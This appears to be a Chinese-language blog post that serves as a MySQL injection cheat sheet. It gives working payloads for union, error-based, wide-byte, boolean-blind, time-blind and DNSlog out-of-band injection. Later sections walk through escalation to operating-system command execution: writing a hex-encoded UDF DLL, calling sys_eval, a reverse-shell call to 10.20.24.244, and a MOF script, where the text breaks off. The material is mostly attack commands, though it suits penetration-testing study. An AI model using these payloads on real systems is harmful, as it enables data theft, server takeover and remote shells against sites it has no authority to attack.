    <content type="html"><![CDATA[<hr><h1 id="MYSQL注入"><a href="#MYSQL注入" class="headerlink" title="MYSQL注入"></a>MYSQL注入</h1><h2 id="Sql-注入介绍"><a href="#Sql-注入介绍" class="headerlink" title="Sql 注入介绍"></a>Sql 注入介绍</h2><p>sql注入就是指Web应用程序在对用户输入的数据未进行合法性的判断，并且前端传入后端的参数是攻击者可控的，并且参数可以带入数据库进行执行。攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。</p><h2 id="Mysql介绍"><a href="#Mysql介绍" class="headerlink" title="Mysql介绍"></a>Mysql介绍</h2><p>MySQL 是一款安全、跨平台、高效的，并与 PHP、Java 等主流编程语言紧密结合的数据库系统。该数据库系统是由瑞典的 MySQL AB 公司开发、发布并支持，由 MySQL 的初始开发人员 David Axmark 和 Michael Monty Widenius 于 1995 年建立的。目前 MySQL 被广泛地应用在 Internet 上的中小型网站中。由于其体积小、速度快、总体拥有成本低，尤其是开放源码这一特点，使得很多公司都采用 MySQL 数据库以降低成本。MySQL 数据库可以称得上是目前运行速度最快的 SQL 语言数据库之一。除了具有许多其他数据库所不具备的功能外，MySQL 数据库还是一种完全免费的产品，用户可以直接通过网络下载 MySQL 数据库，而不必支付任何费用。</p><h2 id="MySQL-基础知识"><a href="#MySQL-基础知识" class="headerlink" title="MySQL 基础知识"></a>MySQL 基础知识</h2><ul><li>字符串截取函数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">left(str,index)  &#x2F;&#x2F;从左边第index开始截取</span><br><span class="line">right(str,index) &#x2F;&#x2F;从右边第index开始截取</span><br><span class="line">substring(str,index) &#x2F;&#x2F;从左边index开始截取</span><br><span class="line">substr(str,index,len) &#x2F;&#x2F;截取str,index开始,截取len的长度</span><br><span class="line">mid(str,index,ken) &#x2F;&#x2F;截取str 从index开始,截取len的长度</span><br></pre></td></tr></table></figure><ul><li>字符串比较</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strcmp(expr1,expr2) &#x2F;&#x2F;如果两个字符串是一样则返回0,如果第一个小于第二个则返回-1</span><br><span class="line">find_in_set(str,strlist) &#x2F;&#x2F;如果相同则返回1不同则返回0</span><br></pre></td></tr></table></figure><ul><li>字符串连接函数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">concat(str1,str2) &#x2F;&#x2F;将字符串首尾相连</span><br><span class="line">concat_ws(separator,str1,str2) &#x2F;&#x2F;将字符串用指定连接符连接</span><br><span class="line">group_concat()&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><ul><li>一些绕过注入的罕见函数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">instr(str1,substr) &#x2F;&#x2F;从子字符串中返回子串第一次出现的位置</span><br><span class="line">lpad(str,len,padstr) rpad(str,len,padstr) &#x2F;&#x2F; 在str的左(右)两边填充给定的padstr到指定的长度len,返回填充的结果</span><br></pre></td></tr></table></figure><ul><li><p>运算符</p><ul><li>算术运算符: <code> + - * /   </code></li><li>比较运算符: <code>= &lt;&gt; != &gt; &lt;   </code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(1)between &#x2F;&#x2F;select database() between 0x61 and 0x7a; &#x2F;&#x2F;select database() between &#39;a&#39; and &#39;z&#39;;</span><br><span class="line">(2)in &#x2F;&#x2F;select &#39;123&#39; in (&#39;12&#39;) &#x3D;&gt; 0</span><br><span class="line">(3)like(模糊匹配) &#x2F;&#x2F;select &#39;12345&#39; like &#39;12%&#39; &#x3D;&gt; true</span><br><span class="line">(4)regexp 或 rlike(正则匹配)&#x2F;&#x2F;select &#39;123455&#39; regexp &#39;^12&#39; &#x3D;&gt; true</span><br></pre></td></tr></table></figure></li><li>逻辑运算符: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">not或! 非  </span><br><span class="line">AND 逻辑与 &#x3D;&#x3D; &amp;&amp;</span><br><span class="line">OR 逻辑或 &#x3D;&#x3D; ||</span><br><span class="line">XOR 逻辑异或 &#x3D;&#x3D; ^</span><br></pre></td></tr></table></figure></li><li>位运算符:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&amp; 按位与</span><br><span class="line">| 按位或</span><br><span class="line">^ 按位异或</span><br><span class="line">! 取反</span><br><span class="line">&lt;&lt; 左移</span><br><span class="line">&gt;&gt;右移</span><br></pre></td></tr></table></figure></li><li>注释符:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># &#x2F;&#x2F;单行注释符,url记得编码为%23</span><br><span class="line">&#x2F;**&#x2F; </span><br><span class="line">--+</span><br></pre></td></tr></table></figure></li></ul></li><li><p>常用函数</p><ul><li>延时函数:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sleep()</span><br><span class="line">benchmark(1000000,sha(1))</span><br></pre></td></tr></table></figure></li><li>编码函数:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hex() ascii()</span><br></pre></td></tr></table></figure></li><li>文件函数:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.load_file  &#x2F;&#x2F;读取文件</span><br><span class="line">2.outfile &#x2F;&#x2F;写入文件</span><br></pre></td></tr></table></figure></li></ul></li><li><p>一些构造语句的知识</p><ul><li>条件语句<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(expr1,expr2,expr3) &#x2F;&#x2F; expr1 true执行expr2否则执行expr3</span><br><span class="line">select case when (条件) then 代码1 else 代码 2 end</span><br></pre></td></tr></table></figure></li><li>information_schema 结构<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">information_schema.tables:</span><br><span class="line">查询表名:table_name  对应的数据库名: table_schema</span><br><span class="line">information_schema.columns:</span><br><span class="line">查询列名:column_name 对应的表名:table_schemamysql盲注语句一般形式</span><br><span class="line">查询结果 + 比较运算符 + 猜测值</span><br></pre></td></tr></table></figure></li><li>mysql 报错注入：构造报错语句 + 查询结果</li><li> mysql 联合注入：构造联合语句 + 查询结果</li><li>mysql 盲注：查询结果 + 比较运算符 + 猜测值</li><li>mysql空白字符：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 &#x2F;**&#x2F; tab</span><br><span class="line">%a0 这个不会被php的\s进行匹配</span><br><span class="line">&#x2F;*!*&#x2F; 内敛注释</span><br><span class="line"> # 这个也可以用来做分隔 挺有意思</span><br></pre></td></tr></table></figure></li><li>tips:</li></ul>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">函数名和括号直接可以插入特殊字符 ex</span><br><span class="line"></span><br><span class="line">concat&#x2F;**&#x2F;()</span><br><span class="line"></span><br><span class="line">information_schema&#x2F;**&#x2F;.&#x2F;**&#x2F;TABLES</span><br><span class="line"></span><br><span class="line">information_schema%0a.%0aTABLES</span><br><span class="line"></span><br><span class="line">&#123;identifier expr&#125;</span><br><span class="line">select &#123;x 1&#125; from &#123;x test&#125; limit 1;</span><br></pre></td></tr></table></figure></li></ul><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p>union是用于合并两个sql查询结果的语句，要使用union必须有相同的列数 、必须有两条以上的select语句组成、列的数据类型必须兼容，兼容的含义是必须数据库可以隐含转换他们的类型。</p><ul><li><p>联合查询注入的主要步骤为：</p><ul><li><p>1.判断是否存在可疑的注入点(数字型或字符型)。<br>  *数字型与字符型注入最大的区别在于：数字型不需要单引号闭合，而字符型一般需要使用单引号来闭合。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">方法一: 单引号法: &#39;</span><br><span class="line">方法二: 逻辑法</span><br><span class="line">and 1&#x3D;1</span><br><span class="line">and 1&#x3D;2</span><br><span class="line">1&#39; and &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">1&#39; and &#39;1&#39;&#x3D;&#39;2</span><br><span class="line">方法三:运算法</span><br><span class="line">-1</span><br><span class="line">-0</span><br></pre></td></tr></table></figure></li><li><p>2.猜解表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">常见敏感表名</span><br><span class="line"></span><br><span class="line">admin</span><br><span class="line">user admin_userinfo</span><br><span class="line">system</span><br><span class="line">vipuser</span><br><span class="line">a_admin</span><br><span class="line">xxx_admin </span><br></pre></td></tr></table></figure></li><li><p>3.猜字段数：order by </p></li><li><p>4.猜解字段名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">敏感字段名:</span><br><span class="line"></span><br><span class="line">username</span><br><span class="line">password</span><br><span class="line">admin_usernmae</span><br><span class="line">admin_password </span><br></pre></td></tr></table></figure></li><li><p>5.获取数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id &#x3D; 1 union select 1,2,3，&#39;&#39;&#39;&#39;&#39;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>注</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">当mysql 版本小于4.0 的时候 ，是不支持 union seletc联合查询的 </span><br><span class="line">当mysql 版本大于5.0时，有个默认数据库information_schema，保存了 Mysql服务器所有数据库的信息,如数据库名，数据库的表， 表栏的数据类型与访问权限等。该数据库拥有⼀个名为 tables 的数据表，该表包含两个字段 table_name 和 table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库</span><br><span class="line">列举几个常见的查询函数</span><br><span class="line"></span><br><span class="line">1.version()- 数据库版本</span><br><span class="line">2.user() -数据库用户</span><br><span class="line">3. database() - 当前所在数据库</span><br><span class="line">4. current_user() - 当前用户名</span><br><span class="line">5. system_user() - 系统用户名</span><br><span class="line">6. session_user() -连接到数据库的用户名</span><br><span class="line">7. @@basedir - 数据库的安装目录</span><br><span class="line">8. @@datadir - 数据库文件存放目录</span><br><span class="line">9. SCHEMATA-  记录当前数据库服务器所有数据库名称</span><br><span class="line">10.TABALES-   记录了当前数据库服务器所有表的信息</span><br></pre></td></tr></table></figure><h2 id="MYSQL报错注入"><a href="#MYSQL报错注入" class="headerlink" title="MYSQL报错注入"></a>MYSQL报错注入</h2><p>常见payload如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.floor()</span><br><span class="line">and (select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br><span class="line"></span><br><span class="line">2.updatexml() &#x2F;&#x2F;5.1.5</span><br><span class="line">and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1))</span><br><span class="line"></span><br><span class="line">3.extractvalue() &#x2F;&#x2F;5.1.5</span><br><span class="line">and extractvalue(1,concat(0x5c,(select user())))</span><br><span class="line"></span><br><span class="line">4.exp() &#x2F;&#x2F;5.5.5版本之后可以使用</span><br><span class="line">select host from user where user &#x3D; &#39;root&#39; and Exp(~(select * from (select version())a));</span><br><span class="line"></span><br><span class="line">5.name_const &#x2F;&#x2F;支持老版本</span><br><span class="line">select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;</span><br><span class="line"></span><br><span class="line">6.geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() 几何函数报错</span><br><span class="line">select multipoint((select * from (select * from (select * from (select version())a)b)c));</span><br></pre></td></tr></table></figure><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入,例如说PHP的编码为 UTF-8而MySql的编码设置为了SET NAMES ‘gbk’ 或是 SET character_set_client =gbk，这样配置会引发编码转换从而导致的注入漏洞。<br>这里要说明一小点的是：<br>SET NAMES ‘x’语句与这三个语句等价：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;SET character_set_client &#x3D;x;</span><br><span class="line">mysql&gt;SET character_set_results &#x3D;x;</span><br><span class="line">mysql&gt;SET character_set_connection &#x3D;x;</span><br></pre></td></tr></table></figure><p>也就是说你设置了 SET NAMES ‘x’ 时就等于同时执行了上面的3条语句</p><p>实际上宽字节注入就是PHP发送请求到MySql时使用了语句SET NAMES ‘gbk’ 或是SET character_set_client =gbk 进行了一次编码，但是又由于一些不经意的字符集转换导致了宽字节注入。</p><ul><li>宽字节注入原理<ul><li>原理可参考：<a href="https://xz.aliyun.com/t/1719">https://xz.aliyun.com/t/1719</a></li><li>在我们正常情况下使用addslashes函数或是开启PHPGPC（注：在php5.4已上已给删除，并且需要说明特别说明一点，GPC无法过滤$_SERVER提交的参数）时过滤GET、POST、COOKIE、REQUSET 提交的参数时，黑客们使用的预定义字符会给转义成添加反斜杠的字符串如下面的例子：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">单引号（&#39;）&#x3D; （\&#39;）</span><br><span class="line">双引号（&quot;） &#x3D; （\&quot;）</span><br><span class="line">反斜杠（\） &#x3D; （\\）</span><br></pre></td></tr></table></figure></li><li>MYSQL client链接编码：假如这个网站有宽字节注入那么我们提交：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;unicodeSqlTest?id&#x3D;%df%27</span><br></pre></td></tr></table></figure>这时,假如我们现在使用的是addslashes来过滤,那么就会发生如下的转换过程:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df%27&#x3D;&#x3D;&#x3D;(addslashes)&#x3D;&#x3D;&#x3D;&gt;%df%5c%27&#x3D;&#x3D;&#x3D;(数据库GBK)&#x3D;&#x3D;&#x3D;&gt;運&#39;</span><br></pre></td></tr></table></figure>前端输入%df%27时首先经过上面addslashes函数转义变成了%df%5c%27（%5c是反斜杠)，之后在数据库查询前因为设置了GBK编码，即是在汉字编码范围内两个字节都会给重新编码为一个汉字。然后MySQL服务器就会对查询语句进行GBK编码即是%df%5c转换成了汉字運，而单引号就逃逸了出来，从而造成了注入漏洞。</li><li>MYSQL iconv函数 mb_convert_encoding函数：<br>借用先知: $id =iconv(‘GBK’,’UTF-8’, $id)<br>%df%27===(addslashes)===&gt;%df%5c%27===(iconv)===&gt;%e5%5c%5c%27<br>其实就是 utf8 -&gt; gbk -&gt;utf-8 低位的%5c 也就是反斜杠干掉了转义单引号的反斜杠。</li><li>Big5编码导致的宽字节注入：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">猜测代码: iconv(&#39;utf-8&#39;,&#39;BIG5&#39;,$_GET[&#39;id&#39;])</span><br><span class="line">payload构造同上: 功&#39; -&gt; addsalshes -&gt; 功\&#39; -&gt; iconv -&gt; %A5%5C%5C%27-&gt;¥\&#39; 逃逸单引号%E8%B1%B9&#39;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>代码存在SQL注入漏洞，但页面不会回显数据，也不会回显错误信息，只返回”Right”与”Wrong”，这里可以构造语句，来判断数据库语句的正确性，通过页面的“真”和“假”来识别我们的判断是否正确，“真”和“假”可以从返回页面，数据包长度，返回码等信息判断</p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>left()函数</td><td>left(database(),1)&gt;’s’ database()显示数据库名称，left(a,b)从左侧截取a的前b位</td></tr><tr><td>regexp</td><td>select user() regex ‘^r’ 正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式</td></tr><tr><td>like</td><td>select user() like ‘ro%’ 与regexp相似，使用like进行匹配</td></tr><tr><td>substr()函数 ascii()函数</td><td>ascii(substr((select database()),1,1))=98 substr(a,b,c)从b位置开始，截取字符串a的长度，ascii()将某个字符转换为ascii值</td></tr><tr><td>ord()函数 mid()函数</td><td>ord(mid((select user()),1,1))=114 mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数同ascii()，将字符转换为ascii值</td></tr></tbody></table><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>代码存在sql注入漏洞，但页面即不会回显数据，也不会回显错误信息，语句执行也不提示真假，不能通过页面的内容来进行判断，这里可通过构造语句，通过页面响应的时长，来判断信息，即时间盲注。</p><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(left(user(),1)&#x3D;&#39;a&#39;,0,sleep(3))    #(user(),1)&#x3D;&#39;a&#39;处替换sql语句</span><br><span class="line">if(sascii(substr(database(),1,1))&gt;115,0,sleep(5))%23  #(database(),1,1)和115处为替换sql语句</span><br></pre></td></tr></table></figure><h2 id="DNSlog-SQL盲注"><a href="#DNSlog-SQL盲注" class="headerlink" title="DNSlog SQL盲注"></a>DNSlog SQL盲注</h2><p>在mysql中load_file 会带dns查询请求<br>具体可以参考 mysql带外攻击 out of band 安全客有这篇文章<br>首先查看变量确定权限<br>show variables like ‘%secure%’</p><p>1、当secure_file_priv为空，就可以读取磁盘的目录。</p><p>2、当secure_file_priv为G:\，就可以读取G盘的文件。</p><p>3、当secure_file_priv为null，load_file就不能加载文件。</p><p>在mysql 5.5.34版本默认为空可以加载文件 但是之后版本为NULL会禁用函数但是<br>可以通过mysql的配置文件my.ini添加行进行配置<br>unc路径 网络共享文件方式 \xq17.com\tet这样的路径<br>用4个\是因为转义 本质是:<br>最好进行加密处理 防止特殊字符导致失败 如下<br>select load_file(concat(0x5c5c5c5c,version(),0x2E66326362386131382E646E736C6F672E6C696E6B2F2F616263));<br>坑点:之前一直用bugscan的dnslog 用<br>select load_file(‘\\‘,version(),’.dnslog地址’) 发现一直收不到信息<br>注意一般分配给我们的是二级域名所以我们要有个点 把返回信息放在三级域名那里 后来用16进制加密之后就发现可以了 可能是传输的时候出现了@之类什么奇怪的字符 导致了传输失败<br>总结:</p><p>1.对数据能加密尽量加密</p><p>2.dns解析 能很好解决盲打盲注的不可知的缺陷</p><p>3.缺点是:限制比较多</p><p>参考：<a href="https://www.t00ls.net/thread-44273-1-1.html">https://www.t00ls.net/thread-44273-1-1.html</a></p><p>工具：<a href="https://xz.aliyun.com/t/2359%E3%80%81https://github.com/ADOOO/DnslogSqlinj">https://xz.aliyun.com/t/2359、https://github.com/ADOOO/DnslogSqlinj</a></p><p>sqlmap：<a href="https://www.cnblogs.com/backlion/p/8984121.html">https://www.cnblogs.com/backlion/p/8984121.html</a></p><p>其他利用：<a href="https://www.freebuf.com/column/184587.html">https://www.freebuf.com/column/184587.html</a></p><h2 id="MYSQL-命令执行"><a href="#MYSQL-命令执行" class="headerlink" title="MYSQL 命令执行"></a>MYSQL 命令执行</h2><ul><li><p>UDF提权</p><p>  UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。 由于是用户自定义的函数，所以我们可以利用UDF创建一个执行命令的函数。</p><p>  Secure_file_priv：secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。通过执行SHOW VARIABLES LIKE “secure_file_priv”;查看secure-file-priv的状态。</p><p>  1、当secure_file_priv的值为null ，表示限制mysql不允许导入导出。</p><p>  2、当secure_file_priv的值为/tmp/ ，表示限制mysql的导入导出只能发生在/tmp/目录下。</p><p>  3、当secure_file_priv的值没有具体值时，表示不对mysql的导入导出做限制。</p><ul><li>UDF提权条件：<ul><li>mysql &lt; 5.0，导出路径随意。</li><li>5.0 &lt;= mysql &lt; 5.1，udf.dll 则需要导出至目标服务器的系统目录 (如：c:/windows/system32/)。</li><li>mysql &gt; 5.1，udf.dll 必须要把udf.dll文件放到MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数。</li><li>掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。</li><li>拥有可以将udf.dll写入相应目录的权限。</li></ul></li><li>实战步骤：<ul><li>查看  secure_file_priv  的值<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#39;secure%&#39;;</span><br></pre></td></tr></table></figure></li><li>查看系统架构以及plugin目录<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%compile%&#39;;             #查看主机版本及架构</span><br><span class="line">show variables like &#39;plugin%&#39;;               #查看 plugin 目录</span><br></pre></td></tr></table></figure></li><li>Sqlmap目录下找到对应的dll文件：Sqlmap将原本的dll文件进行了编码处理,我们需要通过脚本进行解密获得dll文件。（脚本位置/usr/share/sqlmap/extra/cloak/） 执行python cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_进行dll_文件的解码，获得dll文件。</li><li>通过查询语句将dll上传到目标服务器上。路径具体参考udf提权条件（这里演示5.0 &lt;= mysql &lt; 5.1）。执行语句select 0xcode into dumpfile ‘C:\Windows\System32\cooltige.dll’。（写入方法也有select unhex(十六进制)、select char(77,90,144…)）。</li><li>将udf.dll 文件写入数据库：<ul><li>1、远程加载：  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load_file() 函数支持远程加载，配合 dumpfile 实现写入lib 目录下一定要有 plugin 文件夹否则报错</span><br><span class="line">select load_file(&#39;C:\Python27\sqlmap\data\udf\mysql\windows\64&#39;) into dumpfile &quot;C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll&quot;;</span><br></pre></td></tr></table></figure></li><li>2、本地写入：  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create table temp(data longblob);</span><br><span class="line">insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);</span><br><span class="line">update temp set data &#x3D; concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);</span><br><span class="line">select data from temp into dumpfile &quot;C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll&quot;;</span><br></pre></td></tr></table></figure></li></ul></li><li>通过dll文件创建函数。CREATE FUNCTION sys_eval RETURNS STRING SONAME ‘udf.dll’。</li><li>创建成功后就可以直接执行命令：select sys_eval(‘whoami’);</li><li>删除创建的函数DROP FUNCTION sys_eval;</li></ul></li></ul></li><li><p>反弹端口提权<br>实际上这是 UDF 提权的另一种用法，只是这里的动态链接库被定制过的，功能更多更实用一些</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cmdshell        # 执行cmd</span><br><span class="line">downloader      # 下载者,到网上下载指定文件并保存到指定目录</span><br><span class="line">open3389        # 通用开3389终端服务,可指定端口(不改端口无需重启)</span><br><span class="line">backshell       # 反弹Shell</span><br><span class="line">ProcessView     # 枚举系统进程</span><br><span class="line">KillProcess     # 终止指定进程</span><br><span class="line">regread         # 读注册表</span><br><span class="line">regwrite        # 写注册表</span><br><span class="line">shut            # 关机,注销,重启</span><br><span class="line">about           # 说明与帮助函数</span><br></pre></td></tr></table></figure></li></ul><p>反弹端口提权udf链接：<a href="https://github.com/Geekby/langouster_udf">https://github.com/Geekby/langouster_udf</a><br>导入 dll 动态链接库（这里偷懒就忽略了），然后创建自定义函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION backshell RETURNS STRING SONAME &#39;udf.dll&#39;;</span><br><span class="line">select backshell(&quot;10.20.24.244&quot;, 2333);</span><br></pre></td></tr></table></figure><ul><li><p>MOF 提权<br>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。提权的原理是C:/Windows/system32/wbem/mof/目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p><ul><li>上传 mof 文件执行命令,mof 脚本的内容如下：</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace &#x3D; &quot;Root\\Cimv2&quot;; </span><br><span class="line">    Name  &#x3D; &quot;filtP2&quot;; </span><br><span class="line">    Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">            &quot;And TargetInstance.Second &#x3D; 5&quot;; </span><br><span class="line">    QueryLanguage &#x3D; &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name &#x3D; &quot;consPCSV2&quot;; </span><br><span class="line">    ScriptingEngine &#x3D; &quot;JScript&quot;; </span><br><span class="line">    ScriptText &#x3D; </span><br><span class="line">&quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user 